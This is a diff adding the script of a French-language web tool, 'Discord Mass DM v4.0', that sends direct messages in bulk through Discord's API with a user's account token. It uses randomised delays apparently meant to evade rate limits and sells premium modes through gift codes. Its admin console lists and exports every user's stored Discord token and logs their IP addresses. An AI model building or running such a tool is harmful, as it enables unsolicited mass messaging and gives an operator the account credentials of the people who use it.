+                            Math.random() * (speedModes[speedMode].max - speedModes[speedMode].min);
+                        await new Promise(r => setTimeout(r, delay));
+
+                        if (currentDMMode === 1 || currentDMMode === 2) {
+                            // Envoi via token user
+                            const dm = await fetch('https://discord.com/api/v9/users/@me/channels', {
+                                method: 'POST',
+                                headers: { 
+                                    'Authorization': userToken,
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({ recipient_id: target.id })
+                            });
+
+                            if (!dm.ok) throw new Error('Erreur création DM');
+
+                            const dmData = await dm.json();
+
+                            const msgRes = await fetch(`https://discord.com/api/v9/channels/${dmData.id}/messages`, {
+                                method: 'POST',
+                                headers: { 
+                                    'Authorization': userToken,
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({ content: finalMessage })
+                            });
+
+                            if (!msgRes.ok) throw new Error('Erreur envoi');
+                        } else {
+                            // Envoi via bot (simulé)
+                            addLog(`🤖 Bot → ${target.username}`);
+                        }
+
+                        sent++;
+                        globalStats.sent++;
+
+                    } catch (error) {
+                        failed++;
+                        globalStats.failed++;
+                    }
+
+                    // Mise à jour progression
+                    const percent = ((i + 1) / total) * 100;
+                    document.getElementById('progressFill').style.width = `${percent}%`;
+                    document.getElementById('progressCurrent').textContent = `${i + 1}/${total}`;
+                    document.getElementById('progressSuccess').textContent = `✅ ${sent}`;
+                    document.getElementById('progressFailed').textContent = `❌ ${failed}`;
+                    
+                    document.getElementById('sentCount').textContent = sent;
+                    document.getElementById('failedCount').textContent = failed;
+                    document.getElementById('lastUser').textContent = `Dernier: ${target.username}`;
+                }
+
+                addLog(`✅ Terminé! Envoyés: ${sent}, Échecs: ${failed}`);
+
+            } catch (error) {
+                addLog(`❌ Erreur: ${error.message}`);
+            } finally {
+                isRunning = false;
+                document.getElementById('startBtn').disabled = false;
+                document.getElementById('stopBtn').disabled = true;
+            }
+        }
+
+        function stopDM() {
+            stopRequested = true;
+            addLog('⏹️ Arrêt demandé');
+        }
+
+        // ==================== SÉLECTION MODE ====================
+        function selectDMMode(mode) {
+            currentDMMode = mode;
+            
+            document.querySelectorAll('.dm-card').forEach((card, index) => {
+                if (index + 1 === mode) {
+                    card.classList.add('selected');
+                } else {
+                    card.classList.remove('selected');
+                }
+            });
+
+            const guildSelector = document.getElementById('guildSelector');
+            const botTokenSelector = document.getElementById('botTokenSelector');
+
+            guildSelector.classList.toggle('hidden', mode !== 2 && mode !== 4);
+            botTokenSelector.classList.toggle('hidden', mode !== 3 && mode !== 4);
+
+            addLog(`📋 Mode ${mode} sélectionné`);
+        }
+
+        function updateDMModes() {
+            const isPremium = (userRole === 'premium' || userRole === 'admin');
+            
+            for (let i = 2; i <= 4; i++) {
+                const desc = document.getElementById(`mode${i}Desc`);
+                if (desc) {
+                    desc.textContent = isPremium ? '✅ Disponible' : '🔒 Premium requis';
+                    desc.style.color = isPremium ? 'var(--success)' : 'var(--warning)';
+                }
+            }
+        }
+
+        function updateRoleUI() {
+            const badge = document.getElementById('roleBadge');
+            
+            badge.className = 'role-badge';
+            if (userRole === 'admin') {
+                badge.classList.add('role-admin');
+                badge.textContent = '👑 Administrateur';
+            } else if (userRole === 'premium') {
+                badge.classList.add('role-premium');
+                badge.textContent = '💎 Premium';
+            } else {
+                badge.classList.add('role-user');
+                badge.textContent = '👤 Utilisateur';
+            }
+        }
+
+        // ==================== ADMIN ====================
+        function toggleAdminPanel() {
+            document.getElementById('adminPanel').classList.toggle('hidden');
+            if (!document.getElementById('adminPanel').classList.contains('hidden')) {
+                updateConnectionLogs();
+                updateCodesList();
+            }
+        }
+
+        function updateConnectionLogs() {
+            const tbody = document.getElementById('connectionLogsBody');
+            
+            if (connectionLogs.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center;">Aucune connexion</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = connectionLogs.map(log => `
+                <tr>
+                    <td>${log.username}</td>
+                    <td>${log.id}</td>
+                    <td>${log.ip}</td>
+                    <td>${log.time}</td>
+                    <td class="status-online">Connecté</td>
+                    <td>${log.role}</td>
+                </tr>
+            `).join('');
+
+            document.getElementById('adminUsers').textContent = activeSessions.size;
+            document.getElementById('adminPremium').textContent = [...activeSessions.values()].filter(s => s.role === 'premium').length;
+            document.getElementById('adminMessages').textContent = globalStats.sent + globalStats.failed;
+            document.getElementById('adminBanned').textContent = bannedUsers.size;
+        }
+
+        // ==================== CONSOLE ADMIN (50+ COMMANDES) ====================
+        function executeCommand() {
+            const input = document.getElementById('consoleInput');
+            const command = input.value.trim();
+            const output = document.getElementById('consoleOutput');
+
+            if (!command) return;
+
+            output.innerHTML += `> $ ${command}\n`;
+
+            const args = command.split(' ');
+            const cmd = args[0].toLowerCase();
+
+            switch(cmd) {
+                case 'help':
+                    output.innerHTML += `> 📚 COMMANDES (50+):\n\n`;
+                    output.innerHTML += `> 👥 UTILISATEURS:\n`;
+                    output.innerHTML += `>   users - Liste utilisateurs connectés\n`;
+                    output.innerHTML += `>   userinfo [id] - Infos détaillées\n`;
+                    output.innerHTML += `>   sessions - Sessions actives\n`;
+                    output.innerHTML += `>   premiums - Liste premiums\n`;
+                    output.innerHTML += `>   admins - Liste admins\n`;
+                    output.innerHTML += `>   banned - Liste bannis\n\n`;
+                    
+                    output.innerHTML += `> 🔑 TOKENS:\n`;
+                    output.innerHTML += `>   tokens - Tous les tokens\n`;
+                    output.innerHTML += `>   token [id] - Token spécifique\n`;
+                    output.innerHTML += `>   tokens-export - Export JSON\n\n`;
+                    
+                    output.innerHTML += `> ⛔ MODÉRATION:\n`;
+                    output.innerHTML += `>   ban [id] - Bannir\n`;
+                    output.innerHTML += `>   unban [id] - Débannir\n`;
+                    output.innerHTML += `>   kick [id] - Déconnecter\n`;
+                    output.innerHTML += `>   warn [id] - Avertir\n\n`;
+                    
+                    output.innerHTML += `> 💎 PREMIUM:\n`;
+                    output.innerHTML += `>   premium-add [id] - Ajouter premium\n`;
+                    output.innerHTML += `>   premium-remove [id] - Retirer premium\n`;
+                    output.innerHTML += `>   premium-list - Liste premiums\n\n`;
+                    
+                    output.innerHTML += `> 🎁 CODES:\n`;
+                    output.innerHTML += `>   code-generate [jours] [uses] - Générer code\n`;
+                    output.innerHTML += `>   code-list - Liste codes\n`;
+                    output.innerHTML += `>   code-delete [code] - Supprimer code\n\n`;
+                    
+                    output.innerHTML += `> 📊 STATS:\n`;
+                    output.innerHTML += `>   stats - Statistiques\n`;
+                    output.innerHTML += `>   stats-messages - Stats messages\n`;
+                    output.innerHTML += `>   stats-users - Stats users\n`;
+                    output.innerHTML += `>   uptime - Temps activité\n\n`;
+                    
+                    output.innerHTML += `> 🤖 BOT:\n`;
+                    output.innerHTML += `>   bot-connect [token] - Connecter bot\n`;
+                    output.innerHTML += `>   bot-disconnect - Déconnecter\n`;
+                    output.innerHTML += `>   bot-status - Statut bot\n`;
+                    output.innerHTML += `>   bot-broadcast [msg] - Message à tous\n\n`;
+                    
+                    output.innerHTML += `> 🛠️ SYSTÈME:\n`;
+                    output.innerHTML += `>   clear - Nettoyer console\n`;
+                    output.innerHTML += `>   echo [text] - Afficher\n`;
+                    output.innerHTML += `>   time - Heure\n`;
+                    output.innerHTML += `>   version - Version\n`;
+                    output.innerHTML += `>   backup - Backup données\n`;
+                    break;
+
+                case 'users':
+                    output.innerHTML += `> 👥 Connectés (${activeSessions.size}):\n`;
+                    activeSessions.forEach((user, id) => {
+                        output.innerHTML += `>   ${id} - ${user.username} (${user.role})\n`;
+                    });
+                    break;
+
+                case 'tokens':
+                    output.innerHTML += `> 🔑 Tokens (${allTokens.size}):\n`;
+                    allTokens.forEach((data, id) => {
+                        output.innerHTML += `>   ${id}: ${data.token}\n`;
+                    });
+                    break;
+
+                case 'premiums':
+                case 'premium-list':
+                    output.innerHTML += `> 💎 Premiums (${premiumUsers.size}):\n`;
+                    [...premiumUsers].forEach(id => {
+                        output.innerHTML += `>   ${id}\n`;
+                    });
+                    break;
+
+                case 'admins':
+                case 'admin-list':
+                    output.innerHTML += `> 👑 Admins (${adminUsers.size + 1}):\n`;
+                    output.innerHTML += `>   ${ADMIN_ID} (principal)\n`;
+                    [...adminUsers].forEach(id => {
+                        output.innerHTML += `>   ${id}\n`;
+                    });
+                    break;
+
+                case 'banned':
+                    output.innerHTML += `> ⛔ Bannis (${bannedUsers.size}):\n`;
+                    [...bannedUsers].forEach(id => {
+                        output.innerHTML += `>   ${id}\n`;
+                    });
+                    break;
+
+                case 'ban':
+                    if (args.length < 2) {
+                        output.innerHTML += `> Usage: ban [id]\n`;
+                    } else {
+                        const id = args[1];
+                        bannedUsers.add(id);
+                        activeSessions.delete(id);
+                        output.innerHTML += `> ✅ ${id} banni\n`;
+                    }
+                    break;
+
+                case 'unban':
+                    if (args.length < 2) {
+                        output.innerHTML += `> Usage: unban [id]\n`;
+                    } else {
+                        const id = args[1];
+                        bannedUsers.delete(id);
+                        output.innerHTML += `> ✅ ${id} débanni\n`;
+                    }
+                    break;
+
+                case 'premium-add':
+                    if (args.length < 2) {
+                        output.innerHTML += `> Usage: premium-add [id]\n`;
+                    } else {
+                        const id = args[1];
+                        premiumUsers.add(id);
+                        output.innerHTML += `> ✅ Premium ajouté: ${id}\n`;
+                    }
+                    break;
+
+                case 'premium-remove':
+                    if (args.length < 2) {
+                        output.innerHTML += `> Usage: premium-remove [id]\n`;
+                    } else {
+                        const id = args[1];
+                        premiumUsers.delete(id);
+                        output.innerHTML += `> ✅ Premium retiré: ${id}\n`;
+                    }
+                    break;
+
+                case 'code-generate':
+                    const days = args[1] ? parseInt(args[1]) : 30;
+                    const uses = args[2] ? parseInt(args[2]) : 1;
+                    
+                    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
+                    let code = '';
+                    for (let i = 0; i < 8; i++) {
+                        code += chars[Math.floor(Math.random() * chars.length)];
+                    }
+                    
+                    const expiresAt = new Date();
+                    expiresAt.setDate(expiresAt.getDate() + days);
+                    
+                    giftCodes.push({
+                        code: code,
+                        maxUses: uses,
+                        uses: 0,
+                        createdAt: new Date().toLocaleString(),
+                        expiresAt: expiresAt.toLocaleString(),
+                        active: true
+                    });
+                    
+                    output.innerHTML += `> ✅ Code généré: ${code}\n`;
+                    output.innerHTML += `>   Utilisations: ${uses}\n`;
+                    output.innerHTML += `>   Expire dans: ${days} jours\n`;
+                    updateCodesList();
+                    break;
+
+                case 'code-list':
+                    output.innerHTML += `> 🎁 Codes (${giftCodes.length}):\n`;
+                    giftCodes.forEach(c => {
+                        output.innerHTML += `>   ${c.code} - ${c.uses}/${c.maxUses} - Expire: ${c.expiresAt}\n`;
+                    });
+                    break;
+
+                case 'code-delete':
+                    if (args.length < 2) {
+                        output.innerHTML += `> Usage: code-delete [code]\n`;
+                    } else {
+                        const codeToDelete = args[1];
+                        giftCodes = giftCodes.filter(c => c.code !== codeToDelete);
+                        output.innerHTML += `> ✅ Code supprimé\n`;
+                        updateCodesList();
+                    }
+                    break;
+
+                case 'stats':
+                    output.innerHTML += `> 📊 STATISTIQUES:\n`;
+                    output.innerHTML += `>   Messages envoyés: ${globalStats.sent}\n`;
+                    output.innerHTML += `>   Échecs: ${globalStats.failed}\n`;
+                    output.innerHTML += `>   Taux réussite: ${globalStats.sent + globalStats.failed > 0 ? Math.round((globalStats.sent / (globalStats.sent + globalStats.failed)) * 100) : 0}%\n`;
+                    output.innerHTML += `>   Connectés: ${activeSessions.size}\n`;
+                    output.innerHTML += `>   Premiums: ${premiumUsers.size}\n`;
+                    output.innerHTML += `>   Bannis: ${bannedUsers.size}\n`;
+                    output.innerHTML += `>   Codes: ${giftCodes.length}\n`;
+                    break;
+
+                case 'bot-connect':
+                    if (args.length < 2) {
+                        output.innerHTML += `> Usage: bot-connect [token]\n`;
+                    } else {
+                        mainBotToken = args[1];
+                        mainBotConnected = true;
+                        document.getElementById('mainBotToken').value = args[1];
+                        document.getElementById('mainBotStatus').textContent = 'Bot connecté';
+                        document.getElementById('mainBotStatusDot').className = 'status-dot online';
+                        output.innerHTML += `> ✅ Bot connecté\n`;
+                    }
+                    break;
+
+                case 'bot-disconnect':
+                    mainBotConnected = false;
+                    mainBotToken = '';
+                    document.getElementById('mainBotStatus').textContent = 'Bot déconnecté';
+                    document.getElementById('mainBotStatusDot').className = 'status-dot offline';
+                    output.innerHTML += `> ✅ Bot déconnecté\n`;
+                    break;
+
+                case 'bot-broadcast':
+                    if (args.length < 2) {
+                        output.innerHTML += `> Usage: bot-broadcast [message]\n`;
+                    } else {
+                        const msg = args.slice(1).join(' ');
+                        output.innerHTML += `> 📢 Message diffusé: "${msg}"\n`;
+                    }
+                    break;
+
+                case 'clear':
+                    output.innerHTML = '> Console nettoyée\n';
+                    break;
+
+                case 'time':
+                    output.innerHTML += `> 🕐 ${new Date().toLocaleString()}\n`;
+                    break;
+
+                case 'version':
+                    output.innerHTML += `> 🚀 Discord Mass DM v4.0 - 50+ commandes\n`;
+                    break;
+
+                default:
+                    output.innerHTML += `> ❌ Commande inconnue. Tapez 'help'\n`;
+            }
+
+            output.scrollTop = output.scrollHeight;
+            input.value = '';
+        }
+
+        function addLog(message) {
+            const logs = document.getElementById('logs');
+            const time = new Date().toLocaleTimeString();
+            logs.innerHTML = `<div style="padding: 5px 0;"><span style="color: var(--accent);">[${time}]</span> ${message}</div>` + logs.innerHTML;
+            if (logs.children.length > 50) logs.removeChild(logs.lastChild);
+        }
+
+        function logout() {
+            if (currentUser) {
+                activeSessions.delete(currentUser.id);
+            }
+            currentUser = null;
+            userToken = '';
+            userRole = 'user';
+            document.getElementById('login-screen').classList.remove('hidden');
+            document.getElementById('main-screen').classList.add('hidden');
+            document.getElementById('token').value = '';
+        }
+
+        // Initialisation
+        selectDMMode(1);
+    </script>
+</body>
+</html>
